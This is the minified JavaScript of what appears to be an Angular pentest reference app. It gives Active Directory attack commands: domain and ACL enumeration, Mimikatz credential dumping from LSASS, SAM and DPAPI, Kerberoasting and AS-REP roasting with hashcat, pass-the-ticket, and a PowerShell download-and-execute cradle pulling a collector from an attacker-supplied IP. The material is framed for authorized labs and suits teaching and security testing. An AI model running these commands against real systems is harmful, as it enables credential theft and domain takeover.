import{a as b,b as _,c as C,d as w,e as E,f as k}from"./chunk-VFOKBMI4.js";import{e as P,f}from"./chunk-7BWD45GD.js";import{$a as d,Ha as y,La as v,Ua as r,Va as t,W as h,Wa as e,X as g,Xa as o,ab as u,bb as S,cb as x,db as c,mb as n,va as a}from"./chunk-ETCZ6OUV.js";function M(s,m){if(s&1){let i=S();d(0),t(1,"div",8),o(2,"span",9),t(3,"h2"),n(4,"AD Set Flow"),e(),o(5,"span",9),e(),t(6,"div",10)(7,"div",11),x("click",function(){h(i);let l=c();return g(l.selectService("full-ad-compromise-linux"))}),t(8,"div",12),n(9,"AD"),e(),t(10,"div",13)(11,"h2"),n(12,"Full Single Target AD Compromise from Linux"),e(),t(13,"p"),n(14," Single Target! Active Directory attack workflow from Kali Linux: enumeration, credential attacks, lateral movement and domain compromise. "),e()(),o(15,"h3")(16,"p"),e()(),t(17,"div",8),o(18,"span",9),t(19,"h2"),n(20,"Enumeration"),e(),o(21,"span",9),e(),t(22,"div",10)(23,"div",11),x("click",function(){h(i);let l=c();return g(l.selectService("windows"))}),t(24,"div",12),n(25,"WIN"),e(),t(26,"div",13)(27,"h2"),n(28,"Windows Commands"),e(),t(29,"p"),n(30," Enumerate domain users and groups using native Windows commands. "),e()()(),t(31,"div",11),x("click",function(){h(i);let l=c();return g(l.selectService("powerview"))}),t(32,"div",12),n(33,"PV"),e(),t(34,"div",13)(35,"h2"),n(36,"PowerView"),e(),t(37,"p"),n(38," Enumerate domain objects, users, groups and relationships. "),e()()(),t(39,"div",11),x("click",function(){h(i);let l=c();return g(l.selectService("manual"))}),t(40,"div",12),n(41,"MAN"),e(),t(42,"div",13)(43,"h2"),n(44,"Manual Enumeration"),e(),t(45,"p"),n(46," Discover computers, operating systems, sessions and local admin access. "),e()()(),t(47,"div",11),x("click",function(){h(i);let l=c();return g(l.selectService("spn"))}),t(48,"div",12),n(49,"SPN"),e(),t(50,"div",13)(51,"h2"),n(52,"SPN Enumeration"),e(),t(53,"p"),n(54," Identify service principal names and service accounts. "),e()()(),t(55,"div",11),x("click",function(){h(i);let l=c();return g(l.selectService("acl"))}),t(56,"div",12),n(57,"ACL"),e(),t(58,"div",13)(59,"h2"),n(60,"Object Permissions"),e(),t(61,"p"),n(62," Inspect Active Directory ACLs and delegated permissions. "),e()()(),t(63,"div",11),x("click",function(){h(i);let l=c();return g(l.selectService("shares"))}),t(64,"div",12),n(65,"SMB"),e(),t(66,"div",13)(67,"h2"),n(68,"Domain Shares"),e(),t(69,"p"),n(70," Discover accessible shares, SYSVOL and exposed configuration data. "),e()()(),t(71,"div",11),x("click",function(){h(i);let l=c();return g(l.selectService("bloodhound"))}),t(72,"div",12),n(73,"BH"),e(),t(74,"div",13)(75,"h2"),n(76,"BloodHound"),e(),t(77,"p"),n(78," Visualize domain relationships, privileges and potential attack paths. "),e()()()(),t(79,"div",8),o(80,"span",9),t(81,"h2"),n(82,"Attacking"),e(),o(83,"span",9),e(),t(84,"div",10)(85,"div",11),x("click",function(){h(i);let l=c();return g(l.selectService("credentials"))}),t(86,"div",12),n(87,"CR"),e(),t(88,"div",13)(89,"h2"),n(90,"Credential Access"),e(),t(91,"p"),n(92," Assess LSASS, cached credentials, SAM, DPAPI and stored secrets. "),e()()(),t(93,"div",11),x("click",function(){h(i);let l=c();return g(l.selectService("kerberos"))}),t(94,"div",12),n(95,"KR"),e(),t(96,"div",13)(97,"h2"),n(98,"Kerberos Attacks"),e(),t(99,"p"),n(100," Study AS-REP Roasting, Kerberoasting and ticket-based attacks. "),e()()(),t(101,"div",11),x("click",function(){h(i);let l=c();return g(l.selectService("passwords"))}),t(102,"div",12),n(103,"PW"),e(),t(104,"div",13)(105,"h2"),n(106,"Password Attacks"),e(),t(107,"p"),n(108," Assess authentication weaknesses and password security. "),e()()(),t(109,"div",11),x("click",function(){h(i);let l=c();return g(l.selectService("compromise"))}),t(110,"div",12),n(111,"DA"),e(),t(112,"div",13)(113,"h2"),n(114,"Domain Compromise"),e(),t(115,"p"),n(116," Understand DCSync, replication privileges and domain-level impact. "),e()()()(),u()}}function O(s,m){if(s&1&&(d(0),t(1,"h2"),n(2,"Windows Commands"),e(),t(3,"p",16),n(4," Use built-in Windows commands to enumerate domain users and groups. These commands are a useful starting point when working from a domain-joined Windows machine. "),e(),t(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),n(8,"Domain Users"),e()(),o(9,"app-terminal",17),e(),t(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),n(13,"Domain Groups"),e()(),o(14,"app-terminal",17),e(),u()),s&2){let i=c(2);a(9),r("command",i.windowsUsers),a(5),r("command",i.windowsGroups)}}function D(s,m){if(s&1&&(d(0),t(1,"h2"),n(2,"PowerView"),e(),t(3,"p",16),n(4," PowerView provides PowerShell functions for querying Active Directory. Use it to map the domain, enumerate accounts and inspect group memberships. "),e(),t(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),n(8,"Import & Domain Information"),e()(),o(9,"app-terminal",17),e(),t(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),n(13,"User Enumeration"),e()(),o(14,"app-terminal",17),e(),t(15,"mat-expansion-panel")(16,"mat-expansion-panel-header")(17,"mat-panel-title"),n(18,"Group Enumeration"),e()(),o(19,"app-terminal",17),e(),u()),s&2){let i=c(2);a(9),r("command",i.powerViewImport),a(5),r("command",i.powerViewUsers),a(5),r("command",i.powerViewGroups)}}function I(s,m){if(s&1&&(d(0),t(1,"h2"),n(2,"Manual Enumeration"),e(),t(3,"p",16),n(4," Map domain computers, identify operating systems, discover where the current account has local administrator access and inspect active sessions. "),e(),t(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),n(8,"Computers & Operating Systems"),e()(),o(9,"app-terminal",17),e(),t(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),n(13,"Local Administrator Access"),e()(),o(14,"app-terminal",17),e(),t(15,"mat-expansion-panel")(16,"mat-expansion-panel-header")(17,"mat-panel-title"),n(18,"Sessions & Logged-on Users"),e()(),o(19,"app-terminal",17),e(),u()),s&2){let i=c(2);a(9),r("command",i.manualComputers),a(5),r("command",i.manualLocalAdmin),a(5),r("command",i.manualSessions)}}function R(s,m){if(s&1&&(d(0),t(1,"h2"),n(2,"SPN Enumeration"),e(),t(3,"p",16),n(4," Service Principal Names identify services associated with domain accounts. Enumerating them can help identify accounts that warrant further assessment, including potential Kerberoasting exposure. "),e(),t(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),n(8,"Enumerate SPNs with setspn"),e()(),o(9,"app-terminal",17),e(),t(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),n(13,"Enumerate SPNs with PowerView"),e()(),o(14,"app-terminal",17),e(),t(15,"mat-expansion-panel")(16,"mat-expansion-panel-header")(17,"mat-panel-title"),n(18,"DNS Lookup"),e()(),o(19,"app-terminal",17),e(),u()),s&2){let i=c(2);a(9),r("command",i.spnSetspn),a(5),r("command",i.spnPowerView),a(5),r("command",i.spnDns)}}function L(s,m){if(s&1&&(d(0),t(1,"h2"),n(2,"Object Permissions"),e(),t(3,"p",16),n(4," Active Directory ACLs control which security principals can read or modify objects. Review delegated rights carefully to identify potentially significant permissions. "),e(),t(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),n(8,"Common Permission Types"),e()(),o(9,"app-terminal",17),e(),t(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),n(13,"Enumerate Object ACLs"),e()(),o(14,"app-terminal",17),e(),t(15,"mat-expansion-panel")(16,"mat-expansion-panel-header")(17,"mat-panel-title"),n(18,"Find GenericAll Permissions"),e()(),o(19,"app-terminal",17),e(),t(20,"mat-expansion-panel")(21,"mat-expansion-panel-header")(22,"mat-panel-title"),n(23,"Group Membership Changes"),e()(),o(24,"app-terminal",17),e(),u()),s&2){let i=c(2);a(9),r("command",i.aclRights),a(5),r("command",i.aclEnumeration),a(5),r("command",i.aclGenericAll),a(5),r("command",i.aclGroupMembership)}}function T(s,m){if(s&1&&(d(0),t(1,"h2"),n(2,"Domain Shares"),e(),t(3,"p",16),n(4," Enumerate domain shares and review accessible files for configuration data, scripts or other information relevant to the assessment. "),e(),t(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),n(8,"Share Enumeration"),e()(),o(9,"app-terminal",17),e(),t(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),n(13,"Access SYSVOL"),e()(),o(14,"app-terminal",17),e(),t(15,"mat-expansion-panel")(16,"mat-expansion-panel-header")(17,"mat-panel-title"),n(18,"GPP Passwords"),e()(),o(19,"app-terminal",17),e(),u()),s&2){let i=c(2);a(9),r("command",i.sharesEnumeration),a(5),r("command",i.sharesAccess),a(5),r("command",i.sharesGpp)}}function N(s,m){if(s&1&&(d(0),t(1,"h2"),n(2,"BloodHound / SharpHound"),e(),t(3,"p",16),n(4," SharpHound collects Active Directory data. BloodHound visualizes the relationships between users, groups, computers, permissions and sessions to help identify potential attack paths. "),e(),t(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),n(8,"Overview & Useful Queries"),e()(),o(9,"app-terminal",17)(10,"app-terminal",17),e(),t(11,"mat-expansion-panel")(12,"mat-expansion-panel-header")(13,"mat-panel-title"),n(14,"Download SharpHound"),e()(),o(15,"app-terminal",17),e(),t(16,"mat-expansion-panel")(17,"mat-expansion-panel-header")(18,"mat-panel-title"),n(19,"SharpHound Collection (Windows)"),e()(),o(20,"app-terminal",17),e(),t(21,"mat-expansion-panel")(22,"mat-expansion-panel-header")(23,"mat-panel-title"),n(24,"PowerShell Collection"),e()(),o(25,"app-terminal",17),e(),t(26,"mat-expansion-panel")(27,"mat-expansion-panel-header")(28,"mat-panel-title"),n(29,"Start BloodHound (Kali)"),e()(),o(30,"app-terminal",17),e(),t(31,"mat-expansion-panel")(32,"mat-expansion-panel-header")(33,"mat-panel-title"),n(34,"Transfer Results from Evil-WinRM"),e()(),o(35,"app-terminal",17),e(),t(36,"p",16),n(37," After collecting the data, import the generated ZIP into BloodHound. Authenticate to the configured database and use the available analysis queries to explore the collected relationships. "),e(),u()),s&2){let i=c(2);a(9),r("command",i.bloodhoundOverview),a(),r("command",i.bloodhoundQueries),a(5),r("command",i.sharpHoundDownload),a(5),r("command",i.sharpHoundCollection),a(5),r("command",i.sharpHoundPowerShell),a(5),r("command",i.bloodhoundKali),a(5),r("command",i.bloodhoundTransfer)}}function W(s,m){if(s&1&&(d(0),t(1,"h2"),n(2,"Credential Access"),e(),t(3,"p",16),n(4," Assess where Windows stores authentication material, identify the privileges required to access it, and understand the impact of exposed credentials in an authorized environment. "),e(),t(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),n(8,"Security Context & Logged-on Users"),e()(),o(9,"app-terminal",17),e(),t(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),n(13,"LSASS & Logon Credentials"),e()(),o(14,"app-terminal",17),e(),t(15,"mat-expansion-panel")(16,"mat-expansion-panel-header")(17,"mat-panel-title"),n(18,"Cached Domain Credentials"),e()(),o(19,"app-terminal",17),e(),t(20,"mat-expansion-panel")(21,"mat-expansion-panel-header")(22,"mat-panel-title"),n(23,"Local SAM Database"),e()(),o(24,"app-terminal",17),e(),t(25,"mat-expansion-panel")(26,"mat-expansion-panel-header")(27,"mat-panel-title"),n(28,"LSA Secrets"),e()(),o(29,"app-terminal",17),e(),t(30,"mat-expansion-panel")(31,"mat-expansion-panel-header")(32,"mat-panel-title"),n(33,"Credential Manager & Windows Vault"),e()(),o(34,"app-terminal",17),e(),t(35,"mat-expansion-panel")(36,"mat-expansion-panel-header")(37,"mat-panel-title"),n(38,"DPAPI"),e()(),o(39,"app-terminal",17),e(),t(40,"mat-expansion-panel")(41,"mat-expansion-panel-header")(42,"mat-panel-title"),n(43,"Domain Controller Credential Exposure"),e()(),o(44,"app-terminal",17),e(),t(45,"mat-expansion-panel")(46,"mat-expansion-panel-header")(47,"mat-panel-title"),n(48,"Credential Hunting Workflow"),e()()(),u()),s&2){let i=c(2);a(9),r("command",i.attackCredentialOverview),a(5),r("command",i.attackLsass),a(5),r("command",i.attackCachedCredentials),a(5),r("command",i.attackSam),a(5),r("command",i.attackLsaSecrets),a(5),r("command",i.attackCredentialManager),a(5),r("command",i.attackDpapi),a(5),r("command",i.attackNtds)}}function V(s,m){if(s&1&&(d(0),t(1,"h2"),n(2,"Kerberos Attacks"),e(),t(3,"p",16),n(4," Understand Kerberos authentication, identify accounts exposed to ticket-based attacks, and assess the security of service accounts and ticket handling. "),e(),t(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),n(8,"AS-REP Roasting"),e()(),o(9,"app-terminal",17),e(),t(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),n(13,"Kerberoasting"),e()(),o(14,"app-terminal",17),e(),t(15,"mat-expansion-panel")(16,"mat-expansion-panel-header")(17,"mat-panel-title"),n(18,"Ticket Enumeration"),e()(),o(19,"app-terminal",17),e(),t(20,"mat-expansion-panel")(21,"mat-expansion-panel-header")(22,"mat-panel-title"),n(23,"Pass-the-Ticket"),e()(),o(24,"app-terminal",17),e(),t(25,"mat-expansion-panel")(26,"mat-expansion-panel-header")(27,"mat-panel-title"),n(28,"Silver Tickets"),e()(),o(29,"app-terminal",17),e(),u()),s&2){let i=c(2);a(9),r("command",i.attackAsrep),a(5),r("command",i.attackKerberoast),a(5),r("command",i.attackTicketEnumeration),a(5),r("command",i.attackPassTheTicket),a(5),r("command",i.attackSilverTicket)}}function H(s,m){if(s&1&&(d(0),t(1,"h2"),n(2,"Password Attacks"),e(),t(3,"p",16),n(4," Assess password policy and authentication weaknesses while respecting account lockout thresholds, test scope and approved authentication-attempt limits. "),e(),t(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),n(8,"Password & Lockout Policy"),e()(),o(9,"app-terminal",17),e(),t(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),n(13,"LDAP & ADSI Authentication"),e()(),o(14,"app-terminal",17),e(),t(15,"mat-expansion-panel")(16,"mat-expansion-panel-header")(17,"mat-panel-title"),n(18,"Password Spraying"),e()(),o(19,"app-terminal",17),e(),t(20,"mat-expansion-panel")(21,"mat-expansion-panel-header")(22,"mat-panel-title"),n(23,"SMB Authentication \u2014 Kali"),e()(),o(24,"app-terminal",17),e(),t(25,"mat-expansion-panel")(26,"mat-expansion-panel-header")(27,"mat-panel-title"),n(28,"Kerbrute \u2014 Authentication Testing"),e()(),o(29,"app-terminal",17),e(),u()),s&2){let i=c(2);a(9),r("command",i.attackPasswordPolicy),a(5),r("command",i.attackCredentialValidation),a(5),r("command",i.attackPasswordSpray),a(5),r("command",i.attackSmbValidation),a(5),r("command",i.attackKerbrute)}}function G(s,m){if(s&1&&(d(0),t(1,"h2"),n(2,"Domain Compromise"),e(),t(3,"p",16),n(4," Evaluate high-impact Active Directory privileges, understand directory replication abuse, and document the exposure and remediation of privileged credentials. "),e(),t(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),n(8,"DCSync Prerequisites"),e()(),o(9,"app-terminal",17),e(),t(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),n(13,"DCSync Detection & Remediation"),e()(),o(14,"app-terminal",17),e(),t(15,"mat-expansion-panel")(16,"mat-expansion-panel-header")(17,"mat-panel-title"),n(18,"Post-Compromise Checklist"),e()(),o(19,"app-terminal",17),e(),u()),s&2){let i=c(2);a(9),r("command",i.attackDcsyncRequirements),a(5),r("command",i.attackDcsyncDetection),a(5),r("command",i.attackPostCompromise)}}function z(s,m){if(s&1&&(d(0),t(1,"h2"),n(2,"AD Set Flow"),e(),t(3,"p",16),n(4," Follow a structured Active Directory workflow, from port scanning and initial access to privilege escalation, post-compromise enumeration and pivoting. "),e(),t(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),n(8,"01. Scan & Service Enumeration"),e()(),o(9,"app-terminal",17)(10,"app-terminal",17),e(),t(11,"mat-expansion-panel")(12,"mat-expansion-panel-header")(13,"mat-panel-title"),n(14,"02. Access to the Server"),e()(),o(15,"app-terminal",17)(16,"app-terminal",17),e(),t(17,"mat-expansion-panel")(18,"mat-expansion-panel-header")(19,"mat-panel-title"),n(20,"03. Domain & Host Enumeration"),e()(),o(21,"app-terminal",17)(22,"app-terminal",17)(23,"app-terminal",17)(24,"app-terminal",17)(25,"app-terminal",17)(26,"app-terminal",17)(27,"app-terminal",17),e(),t(28,"mat-expansion-panel")(29,"mat-expansion-panel-header")(30,"mat-panel-title"),n(31,"04. Privilege Escalation"),e()(),o(32,"app-terminal",17)(33,"app-terminal",17),e(),t(34,"mat-expansion-panel")(35,"mat-expansion-panel-header")(36,"mat-panel-title"),n(37,"05. Post-Compromise Workflow"),e()(),o(38,"app-terminal",17)(39,"app-terminal",17)(40,"app-terminal",17)(41,"app-terminal",17),e(),t(42,"mat-expansion-panel")(43,"mat-expansion-panel-header")(44,"mat-panel-title"),n(45,"06. Pivoting with Ligolo-ng"),e()(),o(46,"app-terminal",17)(47,"app-terminal",17),e(),t(48,"mat-expansion-panel")(49,"mat-expansion-panel-header")(50,"mat-panel-title"),n(51,"07. Post-Pivoting Enumeration"),e()(),o(52,"app-terminal",17),e(),u()),s&2){let i=c(2);a(9),r("command",i.flowScan),a(),r("command",i.flowServices),a(5),r("command",i.flowWinRM),a(),r("command",i.flowHostEnumeration),a(5),r("command",i.manualComputers),a(),r("command",i.manualLocalAdmin),a(),r("command",i.manualSessions),a(),r("command",i.spnSetspn),a(),r("command",i.spnPowerView),a(),r("command",i.spnDns),a(),r("command",i.aclRights),a(5),r("command",i.flowPrivEscChecks),a(),r("command",i.flowPrivEscReview),a(5),r("command",i.flowPostCompromise),a(),r("command",i.flowCredentialAudit),a(),r("command",i.flowKerberosAudit),a(),r("command",i.flowMssqlAudit),a(5),r("command",i.flowPivotEnumeration),a(),r("command",i.flowLigolo),a(5),r("command",i.flowPostPivot)}}function U(s,m){if(s&1&&(d(0),t(1,"h2"),n(2,"Full AD Compromise from Linux"),e(),t(3,"p"),n(4," Structured Active Directory assessment workflow using Kali Linux. Perform these steps only in systems you are authorized to test. "),e(),t(5,"mat-accordion",18)(6,"mat-expansion-panel")(7,"mat-expansion-panel-header")(8,"mat-panel-title"),n(9,"Phase 0 \u2013 Initial Scan"),e()(),o(10,"app-terminal",17),e(),t(11,"mat-expansion-panel")(12,"mat-expansion-panel-header")(13,"mat-panel-title"),n(14,"Phase 1 \u2013 Enumeration Without Credentials"),e()(),o(15,"app-terminal",17),e(),t(16,"mat-expansion-panel")(17,"mat-expansion-panel-header")(18,"mat-panel-title"),n(19,"Phase 2 \u2013 Enumeration With Credentials"),e()(),o(20,"app-terminal",17),e(),t(21,"mat-expansion-panel")(22,"mat-expansion-panel-header")(23,"mat-panel-title"),n(24,"Phase 3 \u2013 Lateral Movement"),e()(),o(25,"app-terminal",17),e(),t(26,"mat-expansion-panel")(27,"mat-expansion-panel-header")(28,"mat-panel-title"),n(29,"Phase 4 \u2013 Credential Dumping"),e()(),o(30,"app-terminal",17),e()(),u()),s&2){let i=c(2);a(10),r("command",i.linuxAdInitialScan),a(5),r("command",i.linuxAdNoCredentials),a(5),r("command",i.linuxAdWithCredentials),a(5),r("command",i.linuxAdLateralMovement),a(5),r("command",i.linuxAdCredentialDumping)}}function j(s,m){if(s&1){let i=S();t(0,"div",14)(1,"button",15),x("click",function(){h(i);let l=c();return g(l.clearService())}),n(2," \u2190 Back to Active Directory "),e(),v(3,O,15,2,"ng-container",6)(4,D,20,3,"ng-container",6)(5,I,20,3,"ng-container",6)(6,R,20,3,"ng-container",6)(7,L,25,4,"ng-container",6)(8,T,20,3,"ng-container",6)(9,N,38,7,"ng-container",6)(10,W,49,8,"ng-container",6)(11,V,30,5,"ng-container",6)(12,H,30,5,"ng-container",6)(13,G,20,3,"ng-container",6)(14,z,53,20,"ng-container",6)(15,U,31,5,"ng-container",6),e()}if(s&2){let i=c();a(3),r("ngIf",i.selectedService==="windows"),a(),r("ngIf",i.selectedService==="powerview"),a(),r("ngIf",i.selectedService==="manual"),a(),r("ngIf",i.selectedService==="spn"),a(),r("ngIf",i.selectedService==="acl"),a(),r("ngIf",i.selectedService==="shares"),a(),r("ngIf",i.selectedService==="bloodhound"),a(),r("ngIf",i.selectedService==="credentials"),a(),r("ngIf",i.selectedService==="kerberos"),a(),r("ngIf",i.selectedService==="passwords"),a(),r("ngIf",i.selectedService==="compromise"),a(),r("ngIf",i.selectedService==="ad-flow"),a(),r("ngIf",i.selectedService==="full-ad-compromise-linux")}}var A=class s{selectedService=null;selectService(m){this.selectedService=m}clearService(){this.selectedService=null}windowsUsers=`
# List users in the domain
net user /domain

# Get information about a specific domain user
net user <username> /domain
`;windowsGroups=`
# List domain groups
net group /domain

# Enumerate a specific domain group
net group "Sales Department" /domain
`;powerViewImport=`
# Import PowerView
Import-Module .\\PowerView.ps1

# Get basic domain information
Get-NetDomain
`;powerViewUsers=`
# List domain users
Get-NetUser

# Display common names
Get-NetUser | Select-Object cn

# Display password and logon information
Get-NetUser | Select-Object cn,pwdlastset,lastlogon
`;powerViewGroups=`
# List domain groups
Get-NetGroup

# Display group names
Get-NetGroup | Select-Object cn

# Enumerate members of a specific group
Get-NetGroup "Sales Department" | Select-Object member
`;manualComputers=`
# Enumerate domain computers
Get-NetComputer

# Identify operating systems and hostnames
Get-NetComputer | Select-Object operatingsystem,dnshostname

# Include operating system versions
Get-NetComputer | Select-Object operatingsystem,dnshostname,operatingsystemversion
`;manualLocalAdmin=`
# Find systems where the current user has local admin access
Find-LocalAdminAccess
`;manualSessions=`
# Enumerate sessions on a specific computer
Get-NetSession -ComputerName <name> -Verbose

# Example
Get-NetSession -ComputerName files04 -Verbose

# Enumerate logged-on users using PsLoggedOn
.\\PsLoggedon.exe \\\\<name>

# Example
.\\PsLoggedon.exe \\\\files04
`;spnSetspn=`
# List SPNs registered to a user
setspn -L <user>

# Example
setspn -L iis_service
`;spnPowerView=`
# Find domain users with registered SPNs
Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname
`;spnDns=`
# Perform a reverse DNS lookup
nslookup.exe <IP>
`;aclRights=`
# GenericAll: Full control over the object
# GenericWrite: Modify object attributes
# WriteOwner: Change the object's owner
# WriteDACL: Modify the object's access control list
# AllExtendedRights: Inspect the specific extended rights
# ForceChangePassword: Reset a user's password
# Self: Perform permitted self-membership or attribute changes
`;aclEnumeration=`
# Enumerate permissions on a user object
Get-ObjectAcl -Identity <user>

# Example
Get-ObjectAcl -Identity stephanie

# Convert a SID to a name
Convert-SidToName <ObjectSID>
`;aclGenericAll=`
# Find GenericAll permissions on a group
Get-ObjectAcl -Identity "Management Department" |
  Where-Object {$_.ActiveDirectoryRights -eq "GenericAll"} |
  Select-Object SecurityIdentifier,ActiveDirectoryRights
`;aclGroupMembership=`
# Add a user to a domain group
net group "Management Department" stephanie /add /domain

# Verify group membership
Get-NetGroup "Management Department" | Select-Object member

# Remove the user from the group
net group "Management Department" stephanie /delete /domain
`;sharesEnumeration=`
# Discover domain shares
Find-DomainShare

# Check which shares are accessible
Find-DomainShare -CheckShareAccess
`;sharesAccess=`
# List the contents of a SYSVOL path
Get-ChildItem \\\\dc1.corp.com\\sysvol\\corp.com\\
`;sharesGpp=`
# Decrypt a Group Policy Preferences password hash
gpp-decrypt <password>
`;bloodhoundOverview=`
# SharpHound collects Active Directory relationship data.
# BloodHound visualizes relationships and potential attack paths.

# Useful analysis goals:
# - Shortest path to Domain Admin
# - Misconfigured object permissions (ACLs)
# - Local administrator relationships
# - Session-based attack paths
# - Kerberoastable and AS-REP roastable users
`;sharpHoundDownload=`
# Download and load the PowerShell collector
IEX (New-Object Net.WebClient).DownloadString(
  'http://<IP>/SharpHound.ps1'
)

# Alternative: download the executable using certutil
certutil -urlcache -f http://<IP>/SharpHound.exe SharpHound.exe

# Alternative: download a file using PowerShell
Invoke-WebRequest -Uri http://<IP>/SharpHound.exe \`
  -OutFile SharpHound.exe
`;sharpHoundCollection=`
# Collect supported data using SharpHound
.\\SharpHound.exe -c All

# Save the output to a specific directory
.\\SharpHound.exe -c All --outputdirectory C:\\Temp

# Specify the target domain
.\\SharpHound.exe -c All -d resourced.local
`;sharpHoundPowerShell=`
# Import the PowerShell collector
Import-Module .\\SharpHound.ps1

# Review available parameters
Get-Help Invoke-BloodHound

# Collect data and specify the output directory
Invoke-BloodHound -CollectionMethod All \`
  -OutputDirectory C:\\Users\\user\\Desktop \`
  -OutputPrefix "domain audit"
`;bloodhoundKali=`
# Start the Neo4j database service
sudo neo4j start

# Launch BloodHound
bloodhound
`;bloodhoundTransfer=`
# From an Evil-WinRM session, download the collected ZIP
download 20240504120000_BloodHound.zip
`;bloodhoundQueries=`
# Useful BloodHound analysis goals

# Shortest Path to Domain Admin
# Find Local Admin Rights
# Find Kerberoastable Users
# Find AS-REP Roastable Users
# Find Sessions (Logged-on Users)
`;attackCredentialOverview=`
# Identify the current security context
whoami
whoami /all

# Inspect interactive sessions
query user
qwinsta

# Inspect Kerberos tickets
klist

# Credential-access assessment checklist
# - Current user privileges
# - Local administrator or SYSTEM access
# - Logged-on privileged accounts
# - Accessible credential stores
# - Windows security protections
`;attackLsass=`
# Mimikatz: credential material in LSASS
# Use only in an authorized lab with appropriate privileges.

.\\mimikatz.exe

# Within the Mimikatz console
privilege::debug
sekurlsa::logonpasswords
sekurlsa::msv
sekurlsa::tickets
sekurlsa::ekeys

# Results depend on Windows protections, logon state
# and the privileges of the current process.
`;attackCachedCredentials=`
# Inspect cached domain logon credentials
lsadump::cache

# DCC2 / MS Cache v2 is not an NTLM hash.
# Offline password auditing with Hashcat:
hashcat -m 2100 hashes.txt /path/to/wordlist.txt

# John the Ripper:
john --format=mscash2 hashes.txt
`;attackSam=`
# Save local registry hives (requires appropriate privileges)
reg save HKLM\\SAM C:\\Temp\\SAM
reg save HKLM\\SYSTEM C:\\Temp\\SYSTEM

# Analyze the exported hives on Kali
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# SAM contains local account hashes, not all domain hashes.
`;attackLsaSecrets=`
# Inspect LSA secrets
lsadump::secrets

# Inspect local SAM hashes
lsadump::sam

# LSA secrets may contain service-related or machine-account
# material depending on the system configuration.
`;attackCredentialManager=`
# Enumerate credentials visible to the current user
cmdkey /list

# Inspect current Kerberos tickets
klist

# Mimikatz commands for an authorized lab
sekurlsa::credman
vault::cred

# Results depend on Windows version, logon session
# and the current security context.
`;attackDpapi=`
# Inspect DPAPI-related material in memory
sekurlsa::dpapi

# DPAPI can protect browser data, application secrets
# and Credential Manager data.
#
# Recovering a master key does not automatically decrypt
# every protected file. Additional key material may be needed.
`;attackNtds=`
# Assess domain-controller credential exposure.
# Requires valid authentication and appropriate privileges.

# Remote assessment of a single account
impacket-secretsdump -just-dc-user <username> <domain>/<user>@<dc-ip>

# Use a lab account and the actual domain-controller address.
# Ordinary domain-user credentials are not sufficient by themselves.
`;attackAsrep=`
# Kali: request AS-REP material for accounts without
# Kerberos preauthentication (authorized lab)
impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <dc-ip> -no-pass -format hashcat -outputfile asrep.txt

# Offline audit with Hashcat
hashcat -m 18200 asrep.txt /path/to/wordlist.txt

# Windows: Rubeus
.\\Rubeus.exe asreproast /nowrap

# Only accounts configured without preauthentication
# are susceptible to this technique.
`;attackKerberoast=`
# Kali: request service-ticket hashes for SPN accounts
impacket-GetUserSPNs <domain>/<user> -dc-ip <dc-ip> -request -outputfile kerberoast.txt

# Offline audit (Hashcat mode depends on hash type)
hashcat -m 13100 kerberoast.txt /path/to/wordlist.txt

# Windows: Rubeus
.\\Rubeus.exe kerberoast /outfile:kerberoast.txt

# Review account privilege, SPN ownership and password strength.
`;attackTicketEnumeration=`
# List tickets in the current Windows logon session
klist

# Mimikatz: inspect tickets in LSASS
sekurlsa::tickets

# Rubeus: enumerate ticket metadata
.\\Rubeus.exe triage

# Exporting or accessing tickets requires appropriate access.
# Protect exported .kirbi files as sensitive credentials.
`;attackPassTheTicket=`
# Rubeus ticket operations require an authorized lab
# and a valid ticket belonging to the test environment.

# Inspect tickets
klist

# Rubeus ticket import syntax
.\\Rubeus.exe ptt /ticket:<ticket-file.kirbi>

# Verify the current session's ticket cache
klist

# A ticket does not automatically grant access to every host:
# the service, identity, validity and permissions must match.
`;attackSilverTicket=`
# Silver Ticket concepts

# A service ticket is forged using the target service account's
# key material, plus domain and service-specific information.

# Assessment prerequisites:
# - Authorized access to the relevant service-account key
# - Correct domain SID and service SPN
# - Understanding of service-side validation and privileges

# Validate exposure and remediate weak service-account passwords.
# Avoid creating forged tickets outside a controlled lab.
`;attackPasswordPolicy=`
# Inspect domain password and lockout policy
net accounts /domain

# Inspect local account policy
net accounts

# Review:
# - Lockout threshold
# - Lockout duration
# - Observation window
# - Password length and complexity
#
# Confirm the approved testing limits before authentication tests.
`;attackCredentialValidation=`
# LDAP / ADSI can be used to validate credentials in an
# authorized lab. Use placeholders; never store real passwords
# in source code or command history.

$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$pdc = $domainObj.PdcRoleOwner.Name
$dn = "DC=" + $domainObj.Name.Replace(".", ",DC=")
$path = "LDAP://$pdc/$dn"

